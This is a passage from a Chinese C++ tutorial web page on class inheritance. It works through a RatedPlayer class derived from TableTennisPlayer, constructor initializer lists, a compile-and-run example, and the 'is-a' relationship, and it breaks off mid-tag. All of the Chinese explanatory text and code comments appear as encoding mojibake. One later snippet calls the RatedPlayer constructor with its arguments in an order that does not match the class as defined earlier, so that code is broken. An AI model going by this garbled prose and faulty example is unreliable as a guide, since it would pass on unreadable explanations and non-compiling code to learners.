<code>public</code>ï¼‰ï¼ŒæŒ‡å®šç»§æ‰¿ç±»å‹ã€‚</li><li>  <code>BaseClassName</code>: åŸºç±»çš„åç§°ã€‚</li></ul><p><strong><code>RatedPlayer</code> ç±»çš„å®šä¹‰ (æ·»åŠ åˆ° tabtenn0.h æˆ–æ–°çš„å¤´æ–‡ä»¶)</strong></p><p>æˆ‘ä»¬å°† <code>RatedPlayer</code> çš„å®šä¹‰ä¹Ÿæ”¾åœ¨ <code>tabtenn0.h</code> ä¸­ï¼ˆè™½ç„¶åˆ†æˆä¸åŒæ–‡ä»¶æ›´å¥½ï¼‰ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ... (TableTennisPlayer å®šä¹‰ä¹‹å) ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ç®€å•çš„æ´¾ç”Ÿç±»</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RatedPlayer</span> :</span> <span class="keyword">public</span> TableTennisPlayer &#123; <span class="comment">// ä½¿ç”¨ public ç»§æ‰¿</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> rating; <span class="comment">// æ–°å¢æˆå‘˜ï¼šç§¯åˆ†</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// æ´¾ç”Ÿç±»æ„é€ å‡½æ•°</span></span><br><span class="line">    RatedPlayer (<span class="keyword">unsigned</span> <span class="keyword">int</span> r = <span class="number">0</span>, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; fn = <span class="string">&quot;none&quot;</span>,</span><br><span class="line">                 <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; ln = <span class="string">&quot;none&quot;</span>, <span class="keyword">bool</span> ht = <span class="literal">false</span>);</span><br><span class="line">    <span class="comment">// ä½¿ç”¨åŸºç±»å¯¹è±¡è¿›è¡Œæ„é€ </span></span><br><span class="line">    RatedPlayer(<span class="keyword">unsigned</span> <span class="keyword">int</span> r, <span class="keyword">const</span> TableTennisPlayer &amp; tp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ–°å¢æ–¹æ³•</span></span><br><span class="line">    <span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">Rating</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> rating; &#125; <span class="comment">// è·å–ç§¯åˆ†</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">ResetRating</span> <span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> r)</span> </span>&#123; rating = r; &#125; <span class="comment">// é‡ç½®ç§¯åˆ†</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ... (endif) ...</span></span><br></pre></td></tr></table></figure><ul><li>  <code>class RatedPlayer : public TableTennisPlayer</code>: è¿™å£°æ˜äº† <code>RatedPlayer</code> æ˜¯ä¸€ä¸ªä» <code>TableTennisPlayer</code> <strong>å…¬æœ‰ç»§æ‰¿ (publicly derived)</strong> è€Œæ¥çš„ç±»ã€‚</li><li>  <strong>å…¬æœ‰ç»§æ‰¿ (<code>public</code>)</strong>: è¿™æ˜¯æœ€å¸¸ç”¨çš„ç»§æ‰¿æ–¹å¼ã€‚å®ƒå»ºç«‹äº†ä¸€ç§ â€œis-aâ€ å…³ç³»ã€‚åŸºç±»çš„å…¬æœ‰æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­ä»ç„¶æ˜¯å…¬æœ‰çš„ï¼ŒåŸºç±»çš„ä¿æŠ¤æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­ä»ç„¶æ˜¯ä¿æŠ¤çš„ã€‚åŸºç±»çš„ç§æœ‰æˆå‘˜è™½ç„¶è¢«ç»§æ‰¿ä¸‹æ¥äº†ï¼Œä½†åœ¨æ´¾ç”Ÿç±»ä¸­æ˜¯<strong>ä¸å¯ç›´æ¥è®¿é—®</strong>çš„ã€‚</li><li>  <code>RatedPlayer</code> è‡ªåŠ¨æ‹¥æœ‰äº† <code>firstname</code>, <code>lastname</code>, <code>hasTable</code> æ•°æ®æˆå‘˜ä»¥åŠ <code>Name()</code>, <code>HasTable()</code>, <code>ResetTable()</code> æ–¹æ³•ï¼ˆå°½ç®¡ç§æœ‰æˆå‘˜ä¸èƒ½ç›´æ¥è®¿é—®ï¼‰ã€‚</li><li>  <code>RatedPlayer</code> æ·»åŠ äº†è‡ªå·±çš„ç§æœ‰æˆå‘˜ <code>rating</code> å’Œå…¬æœ‰æ–¹æ³• <code>Rating()</code>, <code>ResetRating()</code>ã€‚</li></ul><h3 id="13-1-2-æ„é€ å‡½æ•°ï¼šè®¿é—®æƒé™çš„è€ƒè™‘"><a href="#13-1-2-æ„é€ å‡½æ•°ï¼šè®¿é—®æƒé™çš„è€ƒè™‘" class="headerlink" title="13.1.2 æ„é€ å‡½æ•°ï¼šè®¿é—®æƒé™çš„è€ƒè™‘"></a>13.1.2 æ„é€ å‡½æ•°ï¼šè®¿é—®æƒé™çš„è€ƒè™‘</h3><p>æ´¾ç”Ÿç±»<strong>ä¸èƒ½</strong>ç›´æ¥è®¿é—®åŸºç±»çš„<strong>ç§æœ‰æˆå‘˜</strong>ã€‚é‚£ä¹ˆï¼Œæ´¾ç”Ÿç±»çš„æ„é€ å‡½æ•°å¦‚ä½•åˆå§‹åŒ–ç»§æ‰¿æ¥çš„åŸºç±»ç§æœ‰æˆå‘˜ï¼ˆå¦‚ <code>firstname</code>, <code>lastname</code>ï¼‰å‘¢ï¼Ÿ</p><p>ç­”æ¡ˆæ˜¯ï¼šæ´¾ç”Ÿç±»æ„é€ å‡½æ•°å¿…é¡»è°ƒç”¨<strong>åŸºç±»çš„æ„é€ å‡½æ•°</strong>æ¥å®ŒæˆåŸºç±»éƒ¨åˆ†çš„åˆå§‹åŒ–ã€‚è¿™æ˜¯é€šè¿‡<strong>æˆå‘˜åˆå§‹åŒ–åˆ—è¡¨ (Member Initializer List)</strong> å®ç°çš„ã€‚</p><p><strong>æ´¾ç”Ÿç±»æ„é€ å‡½æ•°çš„å®ç° (æ·»åŠ åˆ° tabtenn0.cpp)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ... (TableTennisPlayer å®ç°ä¹‹å) ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// RatedPlayer æ„é€ å‡½æ•°å®ç°</span></span><br><span class="line">RatedPlayer::RatedPlayer(<span class="keyword">unsigned</span> <span class="keyword">int</span> r, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; fn,</span><br><span class="line">                         <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; ln, <span class="keyword">bool</span> ht)</span><br><span class="line">                         : TableTennisPlayer(fn, ln, ht), rating(r) &#123; <span class="comment">// è°ƒç”¨åŸºç±»æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="comment">// rating(r) åˆå§‹åŒ–æ´¾ç”Ÿç±»è‡ªå·±çš„æˆå‘˜</span></span><br><span class="line">    <span class="comment">// åŸºç±»éƒ¨åˆ†çš„åˆå§‹åŒ–å§”æ‰˜ç»™ TableTennisPlayer çš„æ„é€ å‡½æ•°</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">RatedPlayer::RatedPlayer(<span class="keyword">unsigned</span> <span class="keyword">int</span> r, <span class="keyword">const</span> TableTennisPlayer &amp; tp)</span><br><span class="line">                         : TableTennisPlayer(tp), rating(r) &#123; <span class="comment">// è°ƒç”¨åŸºç±»çš„å¤åˆ¶æ„é€ å‡½æ•° (è¿™é‡Œæ˜¯éšå¼ç”Ÿæˆçš„)</span></span><br><span class="line">    <span class="comment">// rating(r) åˆå§‹åŒ–æ´¾ç”Ÿç±»è‡ªå·±çš„æˆå‘˜</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>: TableTennisPlayer(fn, ln, ht)</code>: è¿™éƒ¨åˆ†æ˜¯æˆå‘˜åˆå§‹åŒ–åˆ—è¡¨çš„å…³é”®ã€‚å®ƒæ˜¾å¼åœ°è°ƒç”¨äº†åŸºç±» <code>TableTennisPlayer</code> çš„æ„é€ å‡½æ•°ï¼Œå¹¶å°†å¿…è¦çš„å‚æ•° (<code>fn</code>, <code>ln</code>, <code>ht</code>) ä¼ é€’ç»™å®ƒã€‚åŸºç±»æ„é€ å‡½æ•°è´Ÿè´£åˆå§‹åŒ– <code>firstname</code>, <code>lastname</code>, <code>hasTable</code>ã€‚</li><li>  <code>, rating(r)</code>: åˆå§‹åŒ–åˆ—è¡¨ä¹Ÿç”¨äºåˆå§‹åŒ–æ´¾ç”Ÿç±»è‡ªå·±çš„æˆå‘˜ <code>rating</code>ã€‚</li><li>  <strong>è§„åˆ™:</strong> åœ¨åˆ›å»ºæ´¾ç”Ÿç±»å¯¹è±¡æ—¶ï¼Œç¨‹åºä¼š<strong>é¦–å…ˆ</strong>è°ƒç”¨åŸºç±»çš„æ„é€ å‡½æ•°æ¥åˆ›å»ºå’Œåˆå§‹åŒ–å¯¹è±¡çš„åŸºç±»éƒ¨åˆ†ï¼Œ<strong>ç„¶å</strong>å†æ‰§è¡Œæ´¾ç”Ÿç±»æ„é€ å‡½æ•°ä½“ï¼ˆå¹¶åˆå§‹åŒ–æ´¾ç”Ÿç±»æˆå‘˜ï¼‰ã€‚å¦‚æœä½ ä¸åœ¨æˆå‘˜åˆå§‹åŒ–åˆ—è¡¨ä¸­æ˜¾å¼è°ƒç”¨åŸºç±»æ„é€ å‡½æ•°ï¼Œç¼–è¯‘å™¨ä¼šå°è¯•è°ƒç”¨åŸºç±»çš„<strong>é»˜è®¤æ„é€ å‡½æ•°</strong>ã€‚å¦‚æœåŸºç±»æ²¡æœ‰é»˜è®¤æ„é€ å‡½æ•°ï¼Œæˆ–è€…ä½ éœ€è¦è°ƒç”¨å¸¦å‚æ•°çš„åŸºç±»æ„é€ å‡½æ•°ï¼Œå°±å¿…é¡»åœ¨åˆå§‹åŒ–åˆ—è¡¨ä¸­æ˜¾å¼è°ƒç”¨ã€‚</li></ul><h3 id="13-1-3-ä½¿ç”¨æ´¾ç”Ÿç±»"><a href="#13-1-3-ä½¿ç”¨æ´¾ç”Ÿç±»" class="headerlink" title="13.1.3 ä½¿ç”¨æ´¾ç”Ÿç±»"></a>13.1.3 ä½¿ç”¨æ´¾ç”Ÿç±»</h3><p>æ´¾ç”Ÿç±»çš„å¯¹è±¡æ‹¥æœ‰åŸºç±»å’Œæ´¾ç”Ÿç±»çš„æ‰€æœ‰å…¬æœ‰æˆå‘˜ã€‚</p><p><strong>usett0.cpp (ä½¿ç”¨ç¤ºä¾‹)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\usett0.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;tabtenn0.h&quot;</span> <span class="comment">// åŒ…å«åŸºç±»å’Œæ´¾ç”Ÿç±»å®šä¹‰</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">( <span class="keyword">void</span> )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="function">TableTennisPlayer <span class="title">player1</span><span class="params">(<span class="string">&quot;Chuck&quot;</span>, <span class="string">&quot;Blizzard&quot;</span>, <span class="literal">true</span>)</span></span>;</span><br><span class="line">    <span class="function">RatedPlayer <span class="title">rplayer1</span><span class="params">(<span class="number">1140</span>, <span class="string">&quot;Mallory&quot;</span>, <span class="string">&quot;Duck&quot;</span>, <span class="literal">true</span>)</span></span>; <span class="comment">// ä½¿ç”¨æ´¾ç”Ÿç±»æ„é€ å‡½æ•°</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ´¾ç”Ÿç±»å¯¹è±¡å¯ä»¥ä½¿ç”¨åŸºç±»çš„æ–¹æ³•</span></span><br><span class="line">    rplayer1.Name(); <span class="comment">// è°ƒç”¨ç»§æ‰¿æ¥çš„ TableTennisPlayer::Name()</span></span><br><span class="line">    <span class="keyword">if</span> (rplayer1.HasTable()) <span class="comment">// è°ƒç”¨ç»§æ‰¿æ¥çš„ TableTennisPlayer::HasTable()</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;: has a table.\n&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;: hasn&#x27;t a table.\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ´¾ç”Ÿç±»å¯¹è±¡å¯ä»¥ä½¿ç”¨è‡ªå·±çš„æ–¹æ³•</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name: &quot;</span>;</span><br><span class="line">    rplayer1.Name();</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;; Rating: &quot;</span> &lt;&lt; rplayer1.Rating() &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// è°ƒç”¨ RatedPlayer::Rating()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¯ä»¥ä½¿ç”¨åŸºç±»å¯¹è±¡åˆå§‹åŒ–æ´¾ç”Ÿç±»å¯¹è±¡ (é€šè¿‡ç‰¹å®šæ„é€ å‡½æ•°)</span></span><br><span class="line">    <span class="function">RatedPlayer <span class="title">rplayer2</span><span class="params">(<span class="number">1212</span>, player1)</span></span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name: &quot;</span>;</span><br><span class="line">    rplayer2.Name();</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;; Rating: &quot;</span> &lt;&lt; rplayer2.Rating() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç¼–è¯‘å’Œè¿è¡Œ:</strong></p><p>ä½ éœ€è¦å°† <code>tabtenn0.cpp</code> å’Œ <code>usett0.cpp</code> ä¸€èµ·ç¼–è¯‘é“¾æ¥ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g++ usett0.cpp tabtenn0.cpp -o usett0</span><br><span class="line">./usett0</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡º:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Duck, Mallory: has a table.</span><br><span class="line">Name: Duck, Mallory; Rating: 1140</span><br><span class="line">Name: Blizzard, Chuck; Rating: 1212</span><br></pre></td></tr></table></figure><h3 id="13-1-4-æ´¾ç”Ÿç±»å’ŒåŸºç±»ä¹‹é—´çš„ç‰¹æ®Šå…³ç³»"><a href="#13-1-4-æ´¾ç”Ÿç±»å’ŒåŸºç±»ä¹‹é—´çš„ç‰¹æ®Šå…³ç³»" class="headerlink" title="13.1.4 æ´¾ç”Ÿç±»å’ŒåŸºç±»ä¹‹é—´çš„ç‰¹æ®Šå…³ç³»"></a>13.1.4 æ´¾ç”Ÿç±»å’ŒåŸºç±»ä¹‹é—´çš„ç‰¹æ®Šå…³ç³»</h3><p>å…¬æœ‰ç»§æ‰¿å»ºç«‹äº†ä¸€ç§éå¸¸é‡è¦çš„å…³ç³»ï¼š</p><ol><li><p> <strong>æ´¾ç”Ÿç±»å¯¹è±¡ä¹Ÿæ˜¯ä¸€ä¸ªåŸºç±»å¯¹è±¡:</strong> ä¸€ä¸ª <code>RatedPlayer</code> å¯¹è±¡<strong>æ˜¯</strong>ä¸€ä¸ª <code>TableTennisPlayer</code> å¯¹è±¡ã€‚è¿™æ„å‘³ç€éœ€è¦ <code>TableTennisPlayer</code> å¯¹è±¡çš„åœ°æ–¹ï¼Œé€šå¸¸å¯ä»¥ä½¿ç”¨ <code>RatedPlayer</code> å¯¹è±¡æ¥æ›¿ä»£ã€‚</p></li><li><p><strong>åŸºç±»æŒ‡é’ˆ/å¼•ç”¨å¯ä»¥æŒ‡å‘/å¼•ç”¨æ´¾ç”Ÿç±»å¯¹è±¡:</strong></p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">RatedPlayer <span class="title">rplayer1</span><span class="params">(<span class="number">1140</span>, <span class="string">&quot;Mallory&quot;</span>, <span class="string">&quot;Duck&quot;</span>, <span class="literal">true</span>)</span></span>;</span><br><span class="line">TableTennisPlayer * pt = &amp;rplayer1; <span class="comment">// åŸºç±»æŒ‡é’ˆæŒ‡å‘æ´¾ç”Ÿç±»å¯¹è±¡ (OK)</span></span><br><span class="line">TableTennisPlayer &amp; rt = rplayer1; <span class="comment">// åŸºç±»å¼•ç”¨å¼•ç”¨æ´¾ç”Ÿç±»å¯¹è±¡ (OK)</span></span><br><span class="line"></span><br><span class="line">pt-&gt;Name(); <span class="comment">// é€šè¿‡åŸºç±»æŒ‡é’ˆè°ƒç”¨åŸºç±»æ–¹æ³• (OK)</span></span><br><span class="line">rt.Name(); <span class="comment">// é€šè¿‡åŸºç±»å¼•ç”¨è°ƒç”¨åŸºç±»æ–¹æ³• (OK)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½†æ˜¯ï¼Œé€šè¿‡åŸºç±»æŒ‡é’ˆ/å¼•ç”¨ä¸èƒ½ç›´æ¥è°ƒç”¨æ´¾ç”Ÿç±»ç‰¹æœ‰çš„æ–¹æ³•</span></span><br><span class="line"><span class="comment">// pt-&gt;Rating(); // é”™è¯¯ï¼TableTennisPlayer æ²¡æœ‰ Rating() æ–¹æ³•</span></span><br><span class="line"><span class="comment">// rt.Rating(); // é”™è¯¯ï¼</span></span><br></pre></td></tr></table></figure><p> è¿™ç§æŒ‡é’ˆ/å¼•ç”¨çš„å…¼å®¹æ€§æ˜¯å®ç°<strong>å¤šæ€ (Polymorphism)</strong> çš„åŸºç¡€ï¼Œæˆ‘ä»¬å°†åœ¨åç»­ç« èŠ‚è¯¦ç»†è®¨è®ºã€‚</p></li></ol><p><strong>æ€»ç»“:</strong></p><ul><li>  ç»§æ‰¿å…è®¸åŸºäºç°æœ‰ç±»ï¼ˆåŸºç±»ï¼‰åˆ›å»ºæ–°ç±»ï¼ˆæ´¾ç”Ÿç±»ï¼‰ã€‚</li><li>  æ´¾ç”Ÿç±»ç»§æ‰¿åŸºç±»çš„æˆå‘˜ï¼ˆæ•°æ®å’Œæ–¹æ³•ï¼‰ã€‚</li><li>  <strong>å…¬æœ‰ç»§æ‰¿ (<code>public</code>)</strong> å»ºç«‹ â€œis-aâ€ å…³ç³»ï¼ŒåŸºç±»çš„å…¬æœ‰æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­ä»æ˜¯å…¬æœ‰ã€‚</li><li>  æ´¾ç”Ÿç±»æ„é€ å‡½æ•°å¿…é¡»é€šè¿‡<strong>æˆå‘˜åˆå§‹åŒ–åˆ—è¡¨</strong>è°ƒç”¨é€‚å½“çš„åŸºç±»æ„é€ å‡½æ•°æ¥åˆå§‹åŒ–ç»§æ‰¿çš„åŸºç±»æˆå‘˜ã€‚</li><li>  æ´¾ç”Ÿç±»å¯¹è±¡å¯ä»¥ä½¿ç”¨åŸºç±»çš„å…¬æœ‰æ–¹æ³•ã€‚</li><li>  åŸºç±»æŒ‡é’ˆæˆ–å¼•ç”¨å¯ä»¥æŒ‡å‘æˆ–å¼•ç”¨æ´¾ç”Ÿç±»å¯¹è±¡ï¼Œä½†åªèƒ½é€šè¿‡å®ƒä»¬è°ƒç”¨åŸºç±»ä¸­å®šä¹‰çš„æ–¹æ³•ï¼ˆé™¤éä½¿ç”¨è™šå‡½æ•°å’ŒåŠ¨æ€è”ç¼–ï¼‰ã€‚</li></ul><h2 id="13-2-ç»§æ‰¿ï¼šis-a-å…³ç³»"><a href="#13-2-ç»§æ‰¿ï¼šis-a-å…³ç³»" class="headerlink" title="13.2 ç»§æ‰¿ï¼šis-a å…³ç³»"></a>13.2 ç»§æ‰¿ï¼šis-a å…³ç³»</h2><p>æˆ‘ä»¬åœ¨ä¸Šä¸€èŠ‚çœ‹åˆ°äº†å¦‚ä½•ä»ä¸€ä¸ªåŸºç±»æ´¾ç”Ÿå‡ºæ–°ç±»ã€‚å…¶ä¸­ï¼Œ<strong>å…¬æœ‰ç»§æ‰¿ (<code>public</code>)</strong> æ˜¯æœ€å¸¸ç”¨çš„ä¸€ç§ç»§æ‰¿æ–¹å¼ï¼Œå®ƒå»ºç«‹äº†ä¸€ç§è¢«ç§°ä¸º <strong>â€œis-aâ€</strong> ï¼ˆæˆ– â€œis-a-kind-ofâ€ï¼‰çš„å…³ç³»æ¨¡å‹ã€‚</p><p><strong>ä»€ä¹ˆæ˜¯ â€œis-aâ€ å…³ç³»ï¼Ÿ</strong></p><p>â€œis-aâ€ å…³ç³»æ„å‘³ç€æ´¾ç”Ÿç±»çš„å¯¹è±¡æœ¬è´¨ä¸Šä¹Ÿæ˜¯åŸºç±»çš„ä¸€ç§ã€‚æ¢å¥è¯è¯´ï¼Œæ´¾ç”Ÿç±»æ˜¯åŸºç±»çš„ä¸€ä¸ª<strong>ç‰¹æ®ŠåŒ–</strong>ç‰ˆæœ¬ã€‚</p><ul><li>  åœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œ<code>RatedPlayer</code> <strong>æ˜¯</strong>ä¸€ä¸ª <code>TableTennisPlayer</code>ã€‚ä¸€ä¸ªæœ‰ç§¯åˆ†çš„çƒå‘˜é¦–å…ˆæ˜¯ä¸€ä¸ªä¹’ä¹“çƒçƒå‘˜ï¼Œåªæ˜¯ä»–è¿˜é¢å¤–å…·æœ‰ç§¯åˆ†å±æ€§ã€‚</li><li>  ç±»ä¼¼åœ°ï¼Œå¦‚æœæœ‰ä¸€ä¸ª <code>Employee</code> ç±»å’Œä¸€ä¸ª <code>Manager</code> ç±»ï¼Œå¹¶ä¸” <code>Manager</code> å…¬æœ‰ç»§æ‰¿è‡ª <code>Employee</code>ï¼Œé‚£ä¹ˆä¸€ä¸ª <code>Manager</code> <strong>æ˜¯</strong>ä¸€ä¸ª <code>Employee</code>ã€‚ç»ç†æ˜¯å‘˜å·¥çš„ä¸€ç§ç‰¹æ®Šç±»å‹ï¼Œå…·æœ‰é¢å¤–çš„èŒè´£æˆ–å±æ€§ã€‚</li><li>  ä¸€ä¸ª <code>Circle</code> <strong>æ˜¯</strong>ä¸€ä¸ª <code>Shape</code>ã€‚</li><li>  ä¸€ä¸ª <code>Dog</code> <strong>æ˜¯</strong>ä¸€ä¸ª <code>Animal</code>ã€‚</li></ul><p><strong>å…¬æœ‰ç»§æ‰¿å¦‚ä½•ä½“ç° â€œis-aâ€ï¼Ÿ</strong></p><p>å…¬æœ‰ç»§æ‰¿ä¹‹æ‰€ä»¥èƒ½æ¨¡æ‹Ÿ â€œis-aâ€ å…³ç³»ï¼Œå…³é”®åœ¨äºå®ƒä¿è¯äº†æ´¾ç”Ÿç±»å¯¹è±¡æ‹¥æœ‰åŸºç±»çš„<strong>æ‰€æœ‰å…¬æœ‰æ¥å£</strong>ã€‚</p><ul><li>  å½“ <code>RatedPlayer</code> å…¬æœ‰ç»§æ‰¿ <code>TableTennisPlayer</code> æ—¶ï¼Œ<code>TableTennisPlayer</code> çš„æ‰€æœ‰ <code>public</code> æˆå‘˜ï¼ˆå¦‚ <code>Name()</code>, <code>HasTable()</code>, <code>ResetTable()</code>ï¼‰åœ¨ <code>RatedPlayer</code> ä¸­ä¹Ÿä¿æŒ <code>public</code>ã€‚</li><li>  è¿™æ„å‘³ç€ä»»ä½•å¯ä»¥å¯¹ <code>TableTennisPlayer</code> å¯¹è±¡æ‰§è¡Œçš„æ“ä½œï¼ˆé€šè¿‡å…¶å…¬æœ‰æ¥å£ï¼‰ï¼ŒåŒæ ·ä¹Ÿå¯ä»¥å¯¹ <code>RatedPlayer</code> å¯¹è±¡æ‰§è¡Œã€‚ä¸€ä¸ª <code>RatedPlayer</code> å¯¹è±¡å¯ä»¥åƒ <code>TableTennisPlayer</code> å¯¹è±¡ä¸€æ ·è¢«ä½¿ç”¨ï¼Œå› ä¸ºå®ƒå…·å¤‡äº† <code>TableTennisPlayer</code> çš„æ‰€æœ‰åŸºæœ¬åŠŸèƒ½ã€‚</li></ul><p><strong>ä»£ç ä½“ç°:</strong></p><p>è¿™ç§å…³ç³»æœ€ç›´æ¥çš„ä½“ç°å°±æ˜¯åŸºç±»æŒ‡é’ˆæˆ–å¼•ç”¨å¯ä»¥æŒ‡å‘æˆ–å¼•ç”¨æ´¾ç”Ÿç±»å¯¹è±¡ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">RatedPlayer <span class="title">rp</span><span class="params">(<span class="string">&quot;May&quot;</span>, <span class="string">&quot;Lee&quot;</span>, <span class="literal">true</span>, <span class="number">1500</span>)</span></span>;</span><br><span class="line"><span class="function">TableTennisPlayer <span class="title">ttp</span><span class="params">(<span class="string">&quot;John&quot;</span>, <span class="string">&quot;Doe&quot;</span>, <span class="literal">false</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// &quot;is-a&quot; å…³ç³»å…è®¸è¿™ç§èµ‹å€¼/åˆå§‹åŒ–</span></span><br><span class="line">TableTennisPlayer &amp; rt = rp; <span class="comment">// åŸºç±»å¼•ç”¨å¯ä»¥å¼•ç”¨æ´¾ç”Ÿç±»å¯¹è±¡</span></span><br><span class="line">TableTennisPlayer * pt = &amp;rp; <span class="comment">// åŸºç±»æŒ‡é’ˆå¯ä»¥æŒ‡å‘æ´¾ç”Ÿç±»å¯¹è±¡</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯ä»¥é€šè¿‡åŸºç±»å¼•ç”¨/æŒ‡é’ˆè°ƒç”¨åŸºç±»çš„æ–¹æ³•</span></span><br><span class="line">rt.Name(); <span class="comment">// è¾“å‡º Lee, May</span></span><br><span class="line">pt-&gt;Name(); <span class="comment">// è¾“å‡º Lee, May</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½†ä¸èƒ½ç›´æ¥é€šè¿‡åŸºç±»å¼•ç”¨/æŒ‡é’ˆè°ƒç”¨æ´¾ç”Ÿç±»ç‰¹æœ‰çš„æ–¹æ³•</span></span><br><span class="line"><span class="comment">// rt.Rating(); // é”™è¯¯! TableTennisPlayer æ²¡æœ‰ Rating() æ–¹æ³•</span></span><br><span class="line"><span class="comment">// pt-&gt;Rating(); // é”™è¯¯!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¹Ÿå¯ä»¥å°†æ´¾ç”Ÿç±»å¯¹è±¡ä¼ é€’ç»™éœ€è¦åŸºç±»å¯¹è±¡çš„å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">showPlayerName</span><span 